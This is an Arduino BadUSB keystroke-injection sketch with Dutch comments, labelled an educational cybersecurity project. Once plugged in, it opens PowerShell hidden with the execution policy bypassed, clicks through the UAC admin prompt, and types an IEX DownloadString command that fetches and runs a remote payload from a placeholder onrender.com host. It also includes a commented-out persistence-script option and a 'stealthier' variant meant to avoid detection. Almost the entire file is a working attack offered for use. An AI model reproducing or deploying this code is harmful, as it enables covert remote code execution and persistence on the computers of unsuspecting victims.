// Arduino Rubber Ducky Script voor BadUSB
// Educational Cybersecurity Project
// VERANDER DE URL NAAR JE RENDER.COM URL!

#include <Keyboard.h>

const String RENDER_URL = "https://your-app-name.onrender.com";
const int DELAY_STARTUP = 3000;  // Wacht tot systeem klaar is
const int DELAY_SHORT = 200;
const int DELAY_MEDIUM = 500;
const int DELAY_LONG = 2000;

void setup() {
  // Wacht tot systeem volledig geboot is
  delay(DELAY_STARTUP);
  
  // Initialiseer keyboard
  Keyboard.begin();
  
  // Voer payload uit
  executePayload();
  
  // Sluit keyboard af
  Keyboard.end();
}

void loop() {
  // Niets - payload wordt één keer uitgevoerd
}

void executePayload() {
  // Open Run dialog (Win+R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(DELAY_MEDIUM);
  
  // Open PowerShell als admin
  Keyboard.print("powershell -ExecutionPolicy Bypass -WindowStyle Hidden");
  delay(DELAY_SHORT);
  
  // CTRL+SHIFT+ENTER voor admin prompt
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(DELAY_LONG);
  
  // UAC bypass - ALT+J voor JA (Nederlands Windows)
  // Voor Engels Windows: gebruik ALT+Y
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('j');  // Verander naar 'y' voor Engels
  delay(100);
  Keyboard.releaseAll();
  delay(DELAY_LONG);
  
  // Download en execute payload
  // Optie 1: Direct via IEX (Internet Explorer eXecute)
  Keyboard.print("IEX(New-Object Net.WebClient).DownloadString('");
  Keyboard.print(RENDER_URL);
  Keyboard.print("/payload')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  // Optie 2: Via hosted script (uncomment indien gewenst)
  /*
  Keyboard.print("IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/persistence.ps1')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  */
}

// Alternatieve payload methode - stealthier
void executeStealth() {
  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(DELAY_MEDIUM);
  
  // Open PowerShell hidden zonder admin (minder detectie)
  Keyboard.print("powershell -WindowStyle Hidden -Command \"");
  Keyboard.print("IEX(New-Object Net.WebClient).DownloadString('");
  Keyboard.print(RENDER_URL);
  Keyboard.print("/payload')\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}
